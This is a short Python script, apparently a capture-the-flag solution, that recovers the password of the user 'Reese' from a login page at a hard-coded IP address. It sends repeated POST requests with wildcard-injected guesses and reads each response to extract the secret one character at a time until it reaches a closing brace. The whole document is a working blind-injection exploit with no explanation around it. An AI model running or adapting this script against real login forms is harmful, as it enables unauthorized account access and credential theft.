#!/usr/bin/python3

import requests
import string

url = 'http://178.128.40.63:31649/login'
session = requests.session()
alphabet = string.ascii_letters+string.digits+'_!@#$%^&{}'
secret=""
while True:
    for ch in alphabet:
        print("trying charachter:\t"+secret+ch)
        data = {'username' : 'Reese','password':secret+ch+'*'}
        response = session.post(url,data = data)
        content = response.text
        #print(content)
        if('const queryString = window.location.search;' not in content):
            secret = secret+ch
            break;
    if('}' in secret):
        break
print("Password:\t"+secret)
